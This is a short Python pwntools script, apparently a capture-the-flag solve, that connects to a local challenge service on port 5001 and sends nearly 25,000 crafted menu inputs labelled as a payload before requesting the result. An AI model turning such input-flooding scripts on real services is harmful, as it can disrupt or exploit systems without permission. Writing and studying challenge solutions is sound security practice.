from pwn import *

r = remote("127.0.0.1", 5001)

print(r.recvline().decode())
print(r.recvline().decode())

prime = 42043 # 60s
count = 24995

with log.progress("Sending payload") as p:
  for i in range(1, count+1):
    p.status("Sending %d" % i)
    r.sendline(b"0")
    r.sendline("{} {}".format(i, 1).encode())

r.sendline(b"1")
print(r.recvline())
print(r.recvline())
